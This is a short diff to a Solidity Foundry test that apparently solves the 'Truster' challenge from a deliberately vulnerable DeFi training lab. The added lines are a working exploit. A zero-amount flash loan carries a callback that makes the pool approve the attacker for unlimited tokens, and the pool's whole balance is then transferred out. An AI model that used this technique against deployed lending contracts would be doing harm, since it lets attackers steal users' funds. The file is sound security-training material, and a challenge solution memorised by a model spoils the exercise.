@@ -37,7 +37,10 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+	vm.startPrank(attacker);
+	trusterLenderPool.flashLoan(0, address(this), address(dvt), abi.encodeWithSignature("approve(address,uint256)", attacker, 2**256 - 1));
+	dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+	vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
